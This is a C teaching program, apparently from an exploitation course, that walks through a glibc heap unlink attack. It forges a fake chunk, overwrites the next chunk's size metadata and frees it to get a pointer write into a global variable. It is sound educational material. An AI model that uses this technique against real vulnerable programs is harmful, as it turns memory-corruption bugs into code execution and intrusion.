#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

uint64_t *target;

int main(void)
{

    puts("So let's explain what a heap Unlink attack is.");
    puts("This will give us a write, however there are several restrictions on what we write and where.");
    puts("Also this attack is only really feasible on pre-tcache libc versions (before 2.26).\n");

    puts("For this attack to work, we need to know the address of a pointer to a heap pointer");
    puts("Think of something like a global variable (like in the bss) array which stores heap pointers.");
    puts("This attack will write a pointer to a little bit before the array (or the entry of the array that points to the heap chunk) to itself.");
    puts("This can be pretty useful for a variety of reasons, especially if we write the pointer to an array of pointers that we can edit. Then we can leverage the pointer from the unlink to overwrite pointers in the array.\n");

    printf("So we start off the attack by allocating two chunks, and storing the first chunk in the global variable pointer target\n");
    printf("The goal of this will be to overwrite the pointer to target with an address right before it.\n\n");
    uint64_t *ptr0, *ptr1, *temp;

    ptr0 = (uint64_t *)malloc(0xa0);
    ptr1 = (uint64_t *)malloc(0xa0);

    target = ptr0;

    printf("The two chunk addresses are %p and %p\n", ptr0, ptr1);
    printf("Target pointer stores the first chunk %p at %p\n\n", target, &target);

    printf("So what an unlink does, is it takes a chunk out of a doubly linked list (which certain freed chunks in the heap are stored in).\n");
    printf("It handles the process of overwriting pointers from the next and previous chunks to the other, to fill in the gap from taking out the chunk in the middle.\n");
    printf("That is where we get our pointer write from. However in order to set this up, we will need to make a fake chunk that will pass three checks.\n");
    printf("So let's start setting up the fake chunk. \n\n");

    printf("The first check we need to worry about, is it checks if the Fd and Bk pointers of our fake heap chunk (they point to the next and previous chunks) point to chunks that have pointers back to our fake chunk.\n");
    printf("This is why we need the heap chunk our fake chunk is stored in to be stored in a pointer somewhere that we know the address of.\n");
    printf("So the previous chunks forward pointer (these chunks are stored in a doubly linked list), and the next chunks back pointer both have to point to this chunk.\n\n");

    printf("The forward pointer of this type of heap chunk is at offset 0x10, and the back pointer is at offset 0x18.\n");
    printf("As a result for the previous pointer we can just subtract 0x10 from the address of the target, and for the forward pointer we will just subtract 0x18 from the address of target.\n");

    target[2] = (uint64_t)(&target - 0x3);    // Fake Chunk P->fd pointer
    target[3] = (uint64_t)(&target - 0x2);    // Fake Chunk  P->bk pointer

    printf("Fd pointer: %p\n", (void *)ptr0[2]);
    printf("Bk  pointer: %p\n\n", (void *)ptr0[3]);

    temp = (uint64_t *)ptr0[2];
    printf("Fake chunk starts at \t%p\n", (void *)ptr0);
    printf("Fd->bk:    \t\t%p\n", (void *)temp[3]);
    temp = (uint64_t *)ptr0[3];
    printf("Bk->Fd:    \t\t%p\n\n", (void *)temp[2]);

    printf("With that, we will pass that check. Next we have to worry about the size check.\n");
    printf("How we will trigger a heap unlink is we will edit the heap metadata of the second chunk, so that it will say that the previous chunk has been freed and it points to our fake chunk.\n");
    printf("Then when we free the second chunk, it will cause our fake chunk to be unlinked and execute the pointer write.\n");
    printf("However it will check that the size of our chunk is equal to the previous size of the chunk being freed, so we have to make sure that they are equal.\n");
    printf("The previous size of the second chunk should be shrunk down so it thinks the heap metadata starts with our fake chunk. This typically means shrinking it by 0x10.\n");
    printf("In addition to that, we have to clear the previous in use bit from the size value of the second chunk, so it thinks that the previous chunk has been freed(this can be done with something like a heap overflow).\n");

    target[0] = 0x0;    // Fake Chunk  Previous Size
    target[1] = 0xa0;    // Fake Chunk  Size


    ptr1[-2] = 0xa0;    // Second Chunk previous size
    ptr1[-1] = 0xb0;    // Secon Chunk size (can be done with a bug like a heap overflow)

    printf("The final check we have to worry about is for fd_nextsize. Essentially it just checks to see if it is equal to 0x0, and if it is it skips a bunch of checks.\n");
    printf("We will set it equal to 0x0 to avoid those unneeded checks.\n\n");

    target[4] = 0x0;    // fd_nextsize

    printf("With that, we have our fake chunk setup. Checkout the other writeups in this module for more details on the particular data structure of this heap chunk.\n\n");

    printf("Fake Chunk Previous Size:\t0x%x\n", (int)ptr0[0]);
    printf("Fake Chunk Size:\t\t0x%x\n", (int)ptr0[1]);
    printf("Fake Chunk Fd pointer:\t\t0x%x\n", (int)ptr0[2]);
    printf("Fake Chunk Bk pointer:\t\t0x%x\n", (int)ptr0[3]);
    printf("Fake Chunk fd_nextsize:\t\t0x%x\n\n", (int)ptr0[4]);

    printf("With that, we can free the second chunk and trigger the unlink.\n");

    free(ptr1);

    printf("With that target should be the address of the Fd pointer: %p\n", target);
}
